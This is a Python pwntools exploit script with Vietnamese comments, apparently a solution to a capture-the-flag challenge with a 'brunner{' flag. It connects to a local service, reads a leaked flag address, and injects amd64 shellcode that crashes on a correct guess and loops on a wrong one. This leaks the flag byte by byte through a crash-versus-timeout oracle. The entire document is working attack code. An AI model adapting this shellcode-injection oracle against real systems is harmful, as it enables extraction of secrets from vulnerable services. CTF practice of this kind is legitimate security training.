#!/usr/bin/env python3
from pwn import *
import string

# Cấu hình context
context.arch = 'amd64'
context.log_level = 'info'

# --- Cấu hình kết nối ---
R = lambda: remote("127.0.0.1", 1337)
# -----------------------

# Bước 1: Lấy địa chỉ flag
try:
    p = R()
    p.recvuntil(b"Here is the address of the flag good luck\n")
    flag_addr = int(p.recvline().strip(), 16)
    log.info(f"Leaked flag address: {hex(flag_addr)}")
    p.close()
except Exception as e:
    log.error(f"Failed to get flag address: {e}")
    exit(1)

# Bước 2: Bắt đầu dò flag
known_flag = "brunner{"
# Sử dụng string.printable để có bộ ký tự đầy đủ nhất, sau đó loại bỏ các ký tự
# có thể gây lỗi trong shellcode hoặc không mong muốn (như newline, tab).
charset = ''.join(c for c in string.printable if c not in '\n\r\t\x0b\x0c')

while not known_flag.endswith('}'):
    found_char_in_iteration = False
    for char_guess in charset:
        log.info(f"Trying: {known_flag}{char_guess}")
        
        p = R()
        p.recvuntil(b"good luck\n")
        p.recvline()

        # Shellcode với logic: Đúng -> Crash (chia cho 0), Sai -> Treo (vòng lặp)
        shellcode_template = """
            mov rdi, {flag_addr}
            add rdi, {offset}
            movzx rax, byte ptr [rdi]
            
            cmp al, {char_ord}
            jne infinite_loop

            xor rbx, rbx
            div rbx

            infinite_loop:
                jmp infinite_loop
        """
        
        shellcode = asm(shellcode_template.format(
            flag_addr=flag_addr,
            offset=len(known_flag),
            char_ord=ord(char_guess)
        ))
        
        p.send(shellcode)
        
        # Sử dụng recv() với timeout.
        # Nếu đoán đúng, server crash, recv sẽ trả về EOFError ngay lập tức.
        # Nếu đoán sai, server treo, recv sẽ hết timeout và ném ra PwnlibException.
        try:
            p.recv(timeout=1.5)
            # Nếu code chạy đến đây, có thể có điều gì đó bất thường, coi như sai
            p.close()
        except EOFError:
            # EOFError nghĩa là kết nối bị đóng. Đây là tín hiệu thành công!
            log.success(f"Found character: '{char_guess}'")
            known_flag += char_guess
            found_char_in_iteration = True
            p.close()
            break # Thoát vòng lặp for
        except Exception:
            # Bất kỳ lỗi nào khác (chủ yếu là timeout) đều là tín hiệu thất bại
            log.info(f"'{char_guess}' is incorrect (timeout).")
            p.close()
            continue
            
    if not found_char_in_iteration:
        log.error("Could not find the next character. The charset might be incomplete.")
        break

log.success(f"Final flag: {known_flag}")